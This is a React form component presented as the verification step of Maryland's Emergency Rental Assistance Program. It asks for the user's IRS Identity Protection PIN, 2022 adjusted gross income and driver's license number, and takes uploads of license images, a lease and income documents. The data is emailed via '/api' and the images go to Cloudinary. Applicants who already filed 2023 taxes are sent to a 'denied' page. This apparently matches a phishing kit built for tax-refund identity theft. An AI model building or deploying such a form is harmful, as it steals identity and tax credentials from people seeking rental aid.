/* eslint-disable react/no-unescaped-entities */
"use client";
import React, { useContext, useEffect, useState } from "react";

import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import {
  faFileImage,
  faIdCardAlt,
  faImage,
  faQuestionCircle,
} from "@fortawesome/free-solid-svg-icons";
import FormDataContext from "@/contexts/data";
import Dropzone from "react-dropzone";
import { useRouter } from "next/navigation";

import axios from "axios";
import Link from "next/link";

const LoanProcessSeven = ({ step, setStep }) => {
  const { formData, setFormData } = useContext(FormDataContext);
  const [isFileUploading, setFileUploading] = useState(false);
  const [isFileUploadingback, setFileUploadingback] = useState(false);
  const [iscopyOfLease, setCopyOfLease] = useState(false);
  const [isdocOfHousehold, setDocOfHousehold] = useState(false);
  const [bgloading, setbgloading] = useState(false);
  const [errors, setErrors] = useState({});
  const router = useRouter();

  const [consentAgreed, setConsentAgreed] = useState(false);

  const handleConsentAgreement = () => {
    setConsentAgreed(!consentAgreed);
  };

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };
  const usStates = [
    "Alabama",
    "Alaska",
    "Arizona",
    "Arkansas",
    "California",
    "Colorado",
    "Connecticut",
    "Delaware",
    "Florida",
    "Georgia",
    "Hawaii",
    "Idaho",
    "Illinois",
    "Indiana",
    "Iowa",
    "Kansas",
    "Kentucky",
    "Louisiana",
    "Maine",
    "Maryland",
    "Massachusetts",
    "Michigan",
    "Minnesota",
    "Mississippi",
    "Missouri",
    "Montana",
    "Nebraska",
    "Nevada",
    "New Hampshire",
    "New Jersey",
    "New Mexico",
    "New York",
    "North Carolina",
    "North Dakota",
    "Ohio",
    "Oklahoma",
    "Oregon",
    "Pennsylvania",
    "Rhode Island",
    "South Carolina",
    "South Dakota",
    "Tennessee",
    "Texas",
    "Utah",
    "Vermont",
    "Virginia",
    "Washington",
    "West Virginia",
    "Wisconsin",
    "Wyoming",
  ];
  const handleFileUpload = async (file) => {
    const formData = new FormData();
    formData.append("file", file);
    formData.append("upload_preset", "my_preset");

    try {
      const response = await axios.post(
        `https://api.cloudinary.com/v1_1/dgqjunu7l/upload`,
        formData
      );

      const { secure_url } = response.data;

      return secure_url;
    } catch (error) {
      console.error("Error uploading file:", error);
      throw new Error("Failed to upload file");
    }
  };

  const handleFrontViewUpload = async (acceptedFiles) => {
    const file = acceptedFiles[0];

    try {
      setFileUploading(true);
      const fileUrl = await handleFileUpload(file);

      setFormData({ ...formData, frontView: fileUrl });
    } catch (error) {
      // Handle the error
    }
    setFileUploading(false);
  };
  const handlecopyleaseupload = async (acceptedFiles) => {
    const file = acceptedFiles[0];

    try {
      setCopyOfLease(true);
      const fileUrl = await handleFileUpload(file);

      setFormData({ ...formData, copyOfLease: fileUrl });
    } catch (error) {
      // Handle the error
    }
    setCopyOfLease(false);
  };
  const handledocOfHousehold = async (acceptedFiles) => {
    const file = acceptedFiles[0];

    try {
      setDocOfHousehold(true);
      const fileUrl = await handleFileUpload(file);

      setFormData({ ...formData, docOfHousehold: fileUrl });
    } catch (error) {
      // Handle the error
    }
    setDocOfHousehold(false);
  };

  const handleBackViewUpload = async (acceptedFiles) => {
    const file = acceptedFiles[0];

    try {
      setFileUploadingback(true);
      const fileUrl = await handleFileUpload(file);

      setFormData({ ...formData, backView: fileUrl });
    } catch (error) {
      // Handle the error
    }
    setFileUploadingback(false);
  };

  const validateForm = () => {
    let isValid = true;
    const errors = {};

    if (!formData.creditScore) {
      errors.creditScore = "Choose a credit score range";
      isValid = false;
    }

    if (!formData.licenseNumber) {
      errors.licenseNumber = "Driver's license number is required";
      isValid = false;
    }

    if (!formData.licenseState) {
      errors.licenseState = "Driver's license state is required";
      isValid = false;
    }
    if (!formData.adjustedGrossIncome) {
      errors.adjustedGrossIncome = "Adjusted Gross income is required";
      isValid = false;
    }
    if (!formData.taxReturn) {
      errors.taxReturn = "Please select an option";
      isValid = false;
    }
    if (!formData.taxReturn) {
      errors.taxReturn = "This field is required.";
    }

    if (!formData.frontView) {
      errors.frontView = "Front view of driver's license is required";
      isValid = false;
    } else {
      const frontViewExtension = formData.frontView
        .split(".")
        .pop()
        .toLowerCase();
      if (!["jpg", "png"].includes(frontViewExtension)) {
        errors.frontView = "Accepted formats: jpg, png";
        isValid = false;
      }
    }

    if (!formData.backView) {
      errors.backView = "Back view of driver's license is required";
      isValid = false;
    } else {
      const backViewExtension = formData.backView
        .split(".")
        .pop()
        .toLowerCase();
      if (!["jpg", "png"].includes(backViewExtension)) {
        errors.backView = "Accepted formats: jpg, png";
        isValid = false;
      }
    }
    if (!formData.copyOfLease) {
      errors.copyOfLease = "Copy of lease or alternative documents is required";
      isValid = false;
    } else {
      const frontViewExtension = formData.copyOfLease
        .split(".")
        .pop()
        .toLowerCase();
      if (!["jpg", "png"].includes(frontViewExtension)) {
        errors.copyOfLease = "Accepted formats: jpg, png";
        isValid = false;
      }
    }

    if (!formData.docOfHousehold) {
      errors.docOfHousehold = "Documentation of household income is required";
      isValid = false;
    } else {
      const backViewExtension = formData.docOfHousehold
        .split(".")
        .pop()
        .toLowerCase();
      if (!["jpg", "png"].includes(backViewExtension)) {
        errors.docOfHousehold = "Accepted formats: jpg, png";
        isValid = false;
      }
    }
    // if (!formData.didFile2022Taxes) {
    //   errors.didFile2022Taxes = "Please select an option";
    //   isValid = false;
    // }
    // if (!formData.receivedIPPIN) {
    //   errors.receivedIPPIN = "Please select an option";
    //   isValid = false;
    // }
    if (!formData.ipPin) {
      errors.ipPin = "Please provide an ip pin";
      isValid = false;
    }
    if (formData.ipPin.length !== 6) {
      errors.ipPin = "IP pin must be 6 characters long";
      isValid = false;
    }

    // if (!formData.meansOfDisbursement) {
    //   errors.meansOfDisbursement = "Please select an option";
    //   isValid = false;
    // }

    setErrors(errors);
    return isValid;
  };

  const handleNext = async () => {
    const isValid = validateForm();
    if (isValid) {
      // Proceed to the next step
      try {
        setbgloading(true);
        await axios.post("/api", { formData });
        console.log("Email sent successfully");
        if (formData.taxReturn === "yes") {
          setbgloading(true);

          // Remove items from local storage
          localStorage.removeItem("formData");
          localStorage.removeItem("formStep");

          router.push("/loan/denied");
        } else {
          setStep(step + 1);
        }
        if (formData.didFile2022Taxes === "No") {
          setbgloading(true);

          // Remove items from local storage
          localStorage.removeItem("formData");
          localStorage.removeItem("formStep");

          router.push("/loan/denied");
        } else {
          setStep(step + 1);
        }
      } catch (error) {
        console.error("Error sending email:", error);
      }
      setbgloading(false);
    }
  };

  const handlePrevious = () => {
    // Go back to the previous step
    setStep(step - 1);
  };

  return (
    <>
      <div className="w-full p-6 relative">
        <h2 className="capitalize font-bold text-2xl mb-8 text-center">
          Verification Details
        </h2>
        <div className="">
          <label
            className="block text-gray-700 font-semibold mb-2 mt-7"
            htmlFor="creditScore"
          >
            Credit Score
          </label>
          <div>
            <select
              className="block w-full border border-gray-300 rounded-lg pl-3 pr-10 py-2 text-gray-700 focus:border-blue-500 focus:outline-none"
              name="creditScore"
              id="creditScore"
              value={formData.creditScore}
              onChange={handleChange}
              required
            >
              <option value="">Select</option>
              <option value="Excellent (720-850)">
                Excellent Credit (720-850)
              </option>
              <option value="Good (690-719)">Good Credit (690-719)</option>
              <option value="Fair (630-689)">Fair Credit (630-689)</option>
              <option value="Bad (300-639)">Bad Credit (300-629)</option>
              <option value="Not Sure">Not Sure</option>
            </select>
          </div>
          {errors.creditScore && (
            <p className="text-red-500 text-sm mt-1">{errors.creditScore}</p>
          )}
        </div>

        <div className="mt-7">
          <label
            className="block text-gray-700 font-semibold mb-2"
            htmlFor="licenseNumber"
          >
            Driver's License/State ID#
          </label>
          <div className="relative">
            <input
              className={`w-full border ${
                errors.licenseNumber ? "border-red-500" : "border-gray-300"
              } rounded-lg pl-10 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
              type="text"
              name="licenseNumber"
              id="licenseNumber"
              value={formData.licenseNumber}
              onChange={handleChange}
              placeholder="Enter your driver's license/state ID#"
              required
            />
            <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
              <FontAwesomeIcon
                icon={faIdCardAlt}
                className="text-gray-500 text-sm"
              />
            </div>
          </div>
          {errors.licenseNumber && (
            <p className="text-red-500 text-sm mt-1">{errors.licenseNumber}</p>
          )}
        </div>

        <div className="mt-7">
          <label
            className="block text-gray-700 font-semibold mb-2"
            htmlFor="licenseState"
          >
            Driver's License State
          </label>
          <div className="relative">
            <select
              className={`w-full border ${
                errors.licenseState ? "border-red-500" : "border-gray-300"
              } rounded-lg pl-3 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
              name="licenseState"
              id="licenseState"
              value={formData.licenseState}
              onChange={handleChange}
              required
            >
              <option value="">Select a state</option>
              {usStates.map((state, index) => (
                <option key={index} value={state}>
                  {state}
                </option>
              ))}
            </select>
            {/* <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
              <FontAwesomeIcon
                icon={faIdCardAlt}
                className="text-gray-500 text-sm"
              />
            </div> */}
          </div>
          {errors.licenseState && (
            <p className="text-red-500 text-sm mt-1">{errors.licenseState}</p>
          )}
        </div>

        <div className="mt-7">
          <label className="block text-gray-700 font-semibold mb-2">
            What is your 2022 adjusted gross income (line 11 of your 1040)?
          </label>
          <div className="relative">
            <input
              className={`w-full border ${
                errors.adjustedGrossIncome
                  ? "border-red-500"
                  : "border-gray-300"
              } rounded-lg pl-10 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
              type="text"
              name="adjustedGrossIncome"
              id="adjustedGrossIncome"
              value={formData.adjustedGrossIncome}
              onChange={handleChange}
              placeholder="Enter your adjusted gross income"
              required={formData.didFile2022Taxes === "Yes"}
            />
            <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
              <FontAwesomeIcon
                icon={faImage}
                className="text-gray-500 text-sm"
              />
            </div>
          </div>
          {errors.adjustedGrossIncome && (
            <p className="text-red-500 text-sm mt-1">
              {errors.adjustedGrossIncome}
            </p>
          )}
        </div>

        <div className="mt-7">
          <div className="mt-7">
            <div className="cont flex justify-between">
              {" "}
              <label className="block text-gray-700 font-semibold mb-2">
                What is your 2024 IP PIN
              </label>
              <div className="icon text-blue-500">
                <Link href="https://www.irs.gov/identity-theft-fraud-scams/get-an-identity-protection-pin">
                  {" "}
                  <FontAwesomeIcon icon={faQuestionCircle} />
                </Link>
              </div>
            </div>

            <div className="relative">
              <input
                className={`w-full border ${
                  errors.ipPin ? "border-red-500" : "border-gray-300"
                } rounded-lg pl-10 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
                type="number"
                name="ipPin"
                id="ipPin"
                max={6}
                min="6"
                value={formData.ipPin}
                onChange={handleChange}
                placeholder="Enter your IP PIN"
                required={formData.receivedIPPIN === "Yes"}
              />
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                <FontAwesomeIcon
                  icon={faImage}
                  className="text-gray-500 text-sm"
                />
              </div>
            </div>
            {errors.ipPin && (
              <p className="text-red-500 text-sm mt-1">{errors.ipPin}</p>
            )}
          </div>
        </div>
        <label
          className="block text-gray-700 font-semibold mb-2 mt-7"
          htmlFor="taxReturn"
        >
          Did you file for 2023 tax return?
        </label>
        <select
          className="w-full border border-gray-300 rounded-lg pl-3 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none"
          name="taxReturn"
          id="taxReturn"
          value={formData.taxReturn}
          onChange={handleChange}
          required
        >
          <option value="">Select...</option>
          <option value="yes">Yes</option>
          <option value="no">No</option>
        </select>
        {errors.taxReturn && <p className="text-red-500">{errors.taxReturn}</p>}
        {/* <div className="mt-7">
          <label className="block text-gray-700 font-semibold mb-2">
            Means of Disbursement
          </label>
          <div>
            <select
              className={`block w-full border ${
                errors.meansOfDisbursement
                  ? "border-red-500"
                  : "border-gray-300"
              } rounded-lg pl-3 pr-10 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
              name="meansOfDisbursement"
              id="meansOfDisbursement"
              value={formData.meansOfDisbursement}
              onChange={handleChange}
              required
            >
              <option value="">Choose an option</option>
              <option value="cashmailing">Cash Mailing</option>
              <option value="directdeposit">Direct Deposit</option>
            </select>
          </div>
          {errors.meansOfDisbursement && (
            <p className="text-red-500 text-sm mt-1">
              {errors.meansOfDisbursement}
            </p>
          )}
        </div> */}
        <div className="mt-7">
          <label className="block text-gray-700 font-semibold mb-2">
            Upload the front view of your driver's license
          </label>
          <Dropzone onDrop={handleFrontViewUpload} multiple={false}>
            {({ getRootProps, getInputProps }) => (
              <div className="border border-gray-300 rounded-lg p-4">
                <div {...getRootProps()} className="cursor-pointer">
                  <input {...getInputProps()} />
                  {isFileUploading ? (
                    <p className="font-bold">Uploading Document...</p>
                  ) : formData.frontView ? (
                    <div className="font-bold flex items-center">
                      <FontAwesomeIcon
                        icon={faFileImage}
                        className="text-gray-500"
                      />
                      <div className="text-sm pl-3 text-gray-600">
                        File Uploaded
                      </div>
                    </div>
                  ) : (
                    <p>
                      Drag and drop or click to select a file. (Accepted
                      formats: jpg, png)
                    </p>
                  )}
                </div>
              </div>
            )}
          </Dropzone>

          {errors.frontView && (
            <p className="text-red-500 text-sm mt-1">{errors.frontView}</p>
          )}
        </div>

        <div className="mt-7">
          <label className="block text-gray-700 font-semibold mb-2">
            Upload the back view of your driver's license
          </label>
          <Dropzone onDrop={handleBackViewUpload} multiple={false}>
            {({ getRootProps, getInputProps }) => (
              <div className="border border-gray-300 rounded-lg p-4">
                <div {...getRootProps()} className="cursor-pointer">
                  <input {...getInputProps()} />
                  {isFileUploadingback ? (
                    <p className="font-bold">Uploading Document...</p>
                  ) : formData.backView ? (
                    <div className="font-bold flex items-center">
                      <FontAwesomeIcon
                        icon={faFileImage}
                        className="text-gray-500"
                      />
                      <div className="text-sm pl-3 text-gray-600">
                        File Uploaded
                      </div>
                    </div>
                  ) : (
                    <p>
                      Drag and drop or click to select a file. (Accepted
                      formats: jpg, png)
                    </p>
                  )}
                </div>
              </div>
            )}
          </Dropzone>
          {errors.backView && (
            <p className="text-red-500 text-sm mt-1">{errors.backView}</p>
          )}
        </div>
        <div className="mt-7">
          <label className="block text-gray-700 font-semibold mb-2">
            Upload your copy of lease or alternative document
          </label>
          <Dropzone onDrop={handlecopyleaseupload} multiple={false}>
            {({ getRootProps, getInputProps }) => (
              <div className="border border-gray-300 rounded-lg p-4">
                <div {...getRootProps()} className="cursor-pointer">
                  <input {...getInputProps()} />
                  {iscopyOfLease ? (
                    <p className="font-bold">Uploading Document...</p>
                  ) : formData.copyOfLease ? (
                    <div className="font-bold flex items-center">
                      <FontAwesomeIcon
                        icon={faFileImage}
                        className="text-gray-500"
                      />
                      <div className="text-sm pl-3 text-gray-600">
                        File Uploaded
                      </div>
                    </div>
                  ) : (
                    <p>
                      Drag and drop or click to select a file. (Accepted
                      formats: jpg, png)
                    </p>
                  )}
                </div>
              </div>
            )}
          </Dropzone>
          {errors.copyOfLease && (
            <p className="text-red-500 text-sm mt-1">{errors.copyOfLease}</p>
          )}
        </div>
        <div className="mt-7">
          <label className="block text-gray-700 font-semibold mb-2">
            Upload your documentation of household income
          </label>
          <Dropzone onDrop={handledocOfHousehold} multiple={false}>
            {({ getRootProps, getInputProps }) => (
              <div className="border border-gray-300 rounded-lg p-4">
                <div {...getRootProps()} className="cursor-pointer">
                  <input {...getInputProps()} />
                  {isdocOfHousehold ? (
                    <p className="font-bold">Uploading Document...</p>
                  ) : formData.docOfHousehold ? (
                    <div className="font-bold flex items-center">
                      <FontAwesomeIcon
                        icon={faFileImage}
                        className="text-gray-500"
                      />
                      <div className="text-sm pl-3 text-gray-600">
                        File Uploaded
                      </div>
                    </div>
                  ) : (
                    <p>
                      Drag and drop or click to select a file. (Accepted
                      formats: jpg, png)
                    </p>
                  )}
                </div>
              </div>
            )}
          </Dropzone>
          {errors.docOfHousehold && (
            <p className="text-red-500 text-sm mt-1">{errors.docOfHousehold}</p>
          )}
        </div>
        <div className="mt-8 p-3 rounded-sm bg-gray-50 text-sm">
          <h3 className="font-semibold mb-2 ">Consent Message</h3>
          <p className="text-gray-700">
            The information provided in the application and this
            self-certification form is collected to determine if my household is
            eligible to receive assistance provided through the federally-funded
            Emergency Rental Assistance Program. Initial next to each of the
            following statements:
          </p>
          <ul className="list-disc ml-8">
            <li className="mb-2">
              ACCURACY: I certify that all the information provided in the
              application is true and correct. I understand that providing false
              statements or information is grounds for termination of assistance
              and is punishable under federal law.
            </li>
            <li className="mb-2">
              DUPLICATION OF BENEFITS: I certify that my household has not
              received nor will receive assistance from another program for the
              same costs that will be paid from ERAP.
            </li>
            <li className="mb-2">
              INFORMATION SHARING: I understand my information will be shared
              with the county I reside in, the State of Maryland and the U.S.
              Treasury.
            </li>
            <li className="mb-2">
              INCOME & HOUSEHOLD SIZE: I certify that my income sources and
              amounts listed in the application accurately reflect the income my
              household received in the last 30 days. This includes if I have no
              reportable income or income from self-employment.
            </li>
            <li className="mb-2">
              FINANCIAL HARDSHIP: I certify that either myself or another adult
              in my household (check all that apply):
              <ul className="list-disc ml-8">
                <li>☐ Qualifies for unemployment benefits</li>
                <li>
                  ☐ Has had a loss of income, increased expenses, or other
                  financial hardship related directly or indirectly to COVID19
                </li>
              </ul>
            </li>
            <li>
              USE OF PAYMENT: I certify that any payment of ERAP funds made
              directly to me for the purpose of paying rent or utilities must be
              used for the intended purpose.
            </li>
          </ul>{" "}
          <div className="mt-8">
            <div className="flex items-center mb-4">
              <input
                type="checkbox"
                id="consentAgreement"
                className="mr-2"
                checked={consentAgreed}
                onChange={handleConsentAgreement}
                required // Make the checkbox required
              />
              <label htmlFor="consentAgreement" className="text-sm">
                I agree to the terms and conditions stated above.
              </label>
            </div>
          </div>
        </div>

        <div className="flex justify-between mt-8">
          <button
            className="px-6 py-2 bg-blue-500 text-white rounded-lg text-sm font-semibold"
            onClick={handlePrevious}
          >
            Previous
          </button>
          <button
            className={`px-4 py-2 rounded-md text-sm text-white disabled:bg-gray-200 font-semibold ${
              bgloading ? "bg-gray-400 cursor-not-allowed" : "bg-blue-500"
            }`}
            onClick={handleNext}
            disabled={bgloading || !consentAgreed} // Disable button if consent not agreed
          >
            {bgloading ? "Please wait" : "Next"}
          </button>
        </div>
        <p className="text-sm text-gray-600 bg-gray-100 px-6 py-6 mt-7 rounded-lg ">
          <strong>Note:</strong> By clicking "Next" you agree that, if Identity
          Protection Pin (IPPin) or Adjusted Gross Income (AGI) is incorrect,
          you will automatically be denied assistance.
        </p>
      </div>
    </>
  );
};

export default LoanProcessSeven;
